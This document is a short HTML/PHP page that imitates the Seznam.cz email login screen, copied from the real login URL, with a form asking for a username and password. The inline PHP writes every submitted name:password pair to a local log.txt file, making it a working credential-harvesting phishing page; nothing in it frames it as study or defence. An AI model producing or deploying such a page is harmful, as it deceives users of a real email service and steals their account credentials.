<!-- saved from url=(0058)https://login.szn.cz/bad-credentials?username=%40seznam.cz -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="width=device-width,initial-scale=1.0">
        <title>Přihlášení do Seznamu</title>        

    <link rel="stylesheet" href="./Přihlášení do Seznamu_files/app.css">
            <h1>Přihlášení do Emailu</h1>
        </header>
        <html>
            <body>
            
            <form action="submit.php" method="get">
            Jmeno: <input type="text" name="name"><br>
            Heslo: <input type="password" name="password"><br>
            <input type="submit">
            </form>
            <?php
            $data=($_GET["name"]) . ':' .  ($_GET["password"] . "\n");
            $fp=fopen('log.txt', 'a');
            fwrite($fp, $data);
            fclose($fp);
            
            ?>
            </body>
            </html>